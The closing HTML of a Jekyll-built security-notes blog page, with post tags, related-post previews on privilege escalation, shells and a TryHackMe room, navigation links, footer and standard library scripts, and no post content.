href="/tags/bash/">bash</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/veryeasy/">veryeasy</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/notes/system/privilage-escalation"><div class="card-body"> <em class="small" data-ts="1650837600" data-df="ll" > Apr 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | Privilage Escalation</h3><div class="text-muted small"><p> Linux Privilage Escalation Check the Hacktricks checklist! Enumeration There are some useful tools like: LinEnum LinuxPrivChecker LinPEAS Kernel Exploits If is an old server we...</p></div></div></a></div><div class="card"> <a href="/notes/system/shell"><div class="card-body"> <em class="small" data-ts="1650837600" data-df="ll" > Apr 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Notes | Shell</h3><div class="text-muted small"><p> Shell The shells are the main objective to compromise an attacked machine. In revshells we can find more. Types Type Description Reverse shell Co...</p></div></div></a></div><div class="card"> <a href="/tryhackme/lazyadmin"><div class="card-body"> <em class="small" data-ts="1652047200" data-df="ll" > May 9, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe | LazyAdmin</h3><div class="text-muted small"><p> Enumeration We start a nmap at the IP. Nmap scan report for 10.10.46.20 Host is up (0.076s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/notes/tools/web-proxies" class="btn btn-outline-primary" prompt="Older"><p>Notes | Web Proxies</p></a> <a href="/notes/vulnerabilities/command-injections" class="btn btn-outline-primary" prompt="Newer"><p>Notes | Command Injections</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/zeropiowastaken">zeropio</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/rootme/">rootme</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/bash/">bash</a> <a class="post-tag" href="/tags/crypto/">crypto</a> <a class="post-tag" href="/tags/tool/">tool</a> <a class="post-tag" href="/tags/veryeasy/">veryeasy</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3"></p><button type="button" class="btn btn-primary" aria-label="Update"> </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
